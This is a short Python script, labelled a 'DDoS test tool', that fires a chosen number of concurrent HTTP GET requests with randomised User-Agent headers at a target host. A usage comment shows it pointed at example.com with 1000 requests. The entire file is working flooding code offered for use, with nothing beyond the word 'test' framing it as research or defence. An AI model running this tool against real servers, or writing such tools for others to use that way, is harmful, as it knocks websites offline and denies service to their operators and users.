import asyncio
import random
import time
import sys
import argparse
import socket

async def attack(url):
    reader, writer = await asyncio.open_connection(
        url, 80, ssl=None, family=socket.AF_INET)
    writer.write(b"GET / HTTP/1.1\r\n")
    writer.write(b"Host: " + url.encode() + b"\r\n")
    writer.write(b"User-Agent: " + str(random.randint(1,10000)).encode() + b"\r\n")
    writer.write(b"Accept-Encoding: gzip, deflate\r\n")
    writer.write(b"Connection: keep-alive\r\n\r\n")
    await writer.drain()
    writer.close()
    await writer.wait_closed()

async def main(url, requests):
    tasks = []
    for i in range(requests):
        tasks.append(attack(url))
    await asyncio.gather(*tasks)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='DDoS test tool. by w01f @xai_yak')
    parser.add_argument('url', help='Target URL')
    parser.add_argument('requests', type=int, help='Number of requests to send')
    args = parser.parse_args()

    try:
        print(f"Sending {args.requests} requests to {args.url}")
        start_time = time.time()
        asyncio.run(main(args.url, args.requests))
        print(f"Requests completed in {time.time() - start_time:.2f} seconds")
    except KeyboardInterrupt:
        print("Interrupted")
        sys.exit(1)
# python nginx_dos.py example.com 1000
